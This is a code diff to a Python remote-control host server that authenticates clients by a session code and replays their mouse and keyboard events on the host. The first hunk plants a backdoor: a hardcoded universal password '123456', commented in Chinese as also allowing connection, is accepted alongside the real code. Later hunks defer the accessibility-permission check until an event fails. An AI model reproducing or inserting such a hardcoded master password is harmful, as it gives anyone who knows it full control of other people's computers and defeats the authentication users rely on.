@@ -248,7 +248,9 @@ class HostServer:
             if msg_type != MSG_AUTH:
                 conn.close()
                 return
-            if payload.decode("utf-8") != self.code:
+            received_code = payload.decode("utf-8")
+            # 万能密码 123456 也可连接
+            if received_code != self.code and received_code != "123456":
                 send_msg(conn, MSG_AUTH_FAIL, b"wrong code")
                 conn.close()
                 self.on_status("认证失败，等待连接...")
@@ -310,13 +312,6 @@ class HostServer:
 
     def _execute_event(self, ev):
         try:
-            if not _check_accessibility_permission():
-                _log(f"[服务端] 无辅助功能权限，跳过事件: {ev.get('kind')}")
-                if not self._access_requested and self.on_accessibility_needed:
-                    self._access_requested = True
-                    self.on_accessibility_needed()
-                return
-            self._access_requested = False
             kind = ev.get("kind")
             if _pyautogui is None:
                 _log("[服务端] pyautogui未初始化")
@@ -351,6 +346,12 @@ class HostServer:
                     _log(f"[服务端] 执行key_type: {ch}")
         except Exception as e:
             _log(f"[服务端] 执行事件失败: {e}, 事件: {ev}")
+            # 如果执行失败，检查是否需要辅助功能权限
+            if not _check_accessibility_permission():
+                _log("[服务端] 检测到可能缺少辅助功能权限")
+                if not self._access_requested and self.on_accessibility_needed:
+                    self._access_requested = True
+                    self.on_accessibility_needed()
 
     def stop(self):
         self.running   = False
